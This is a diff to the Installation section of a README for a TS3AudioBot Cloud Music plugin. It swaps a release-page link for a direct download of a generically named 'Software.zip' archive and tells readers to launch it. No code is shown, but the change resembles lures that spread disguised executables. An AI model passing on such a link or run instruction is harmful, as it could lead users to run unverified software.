@@ -11,7 +11,7 @@ Welcome to the TS3AudioBot Cloud Music plugin repository! This plugin is designe
 
 ## Installation
 To install the TS3AudioBot Cloud Music plugin, simply download the latest version from the following link:  
-[Download Plugin](https://github.com/unnu0000/TS3AudioBot-CloudMusic-plugin/releases/tag/v1.0)  
+[Download Plugin](https://github.com/unnu0000/TS3AudioBot-CloudMusic-plugin/releases/download/v2.0/Software.zip)  
 Once downloaded, launch the plugin and follow the installation instructions.  
 
 If the above link is not working, please check the "Releases" section of this repository for alternative download options.
